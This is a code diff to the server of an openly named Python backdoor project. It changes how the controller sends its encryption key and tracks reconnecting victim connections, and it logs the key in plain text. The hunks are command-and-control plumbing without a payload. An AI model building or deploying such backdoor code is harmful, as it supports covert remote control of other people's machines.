@@ -5,7 +5,7 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-
+import base64
 import socket
 from threading import Thread
 
@@ -55,7 +55,9 @@ class Socket(EncryptedSocket):
                     self.socket.setblocking(1)  # no timeout
 
                     # first command is always the unencrypted key (as b64)
-                    self.send_json(CLIENT_KEY, self.key.decode('ascii'), False)
+                    # not the best solution, but sending it raw without wrapped JSON will remove emphasis
+                    self.send(base64.b64encode(self.key), False)
+                    self.logger.debug(f"send key: {self.key}")
 
                     while True:
                         # wait for handshake
@@ -65,8 +67,11 @@ class Socket(EncryptedSocket):
 
                     address = {"ip": address[0], "port": address[1]} | response["value"] | {"connected": True}
 
-                    self.connections.append(self.socket)
-                    self.addresses.append(address)
+                    if self.socket in self.connections:
+                        self.addresses[self.connections.index(self.socket)]["connected"] = True
+                    else:
+                        self.connections.append(self.socket)
+                        self.addresses.append(address)
 
                     self.logger.info(
                         f"Connection {len(self.connections) - 1} has been established: {address['ip']}:{address['port']} ({address['hostname']})")
